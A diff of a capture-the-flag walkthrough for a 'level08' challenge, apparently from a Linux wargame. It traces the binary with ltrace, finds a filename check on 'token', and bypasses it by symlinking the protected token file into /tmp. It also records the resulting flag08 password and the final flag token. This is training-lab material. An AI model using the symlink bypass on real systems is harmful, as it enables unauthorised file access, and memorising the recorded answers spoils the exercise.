@@ -1,12 +1,13 @@
-ltrace ./level08 token
+🔻 Analyze
+⬇️ ltrace ./level08 token
+👉 strstr("token", "token")
+⬇️ echo "test" > /tmp/some
+⬇️ ./level08 /tmp/some
 
-echo ok > /tmp/some
-./level08 /tmp/some
 
-cp /home/user/level08/token /tmp/some
-
-========
-
-ln -s /home/user/level08/token /tmp/link
-./level08 /tmp/link
-su flag08
+🔻 Hack
+⬇️ ln -s /home/user/level08/token /tmp/link
+⬇️ ./level08 /tmp/link
+⬇️ su flag08 ↪️ quif5eloekouj29ke0vouxean
+⬇️ getflag
+👉 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
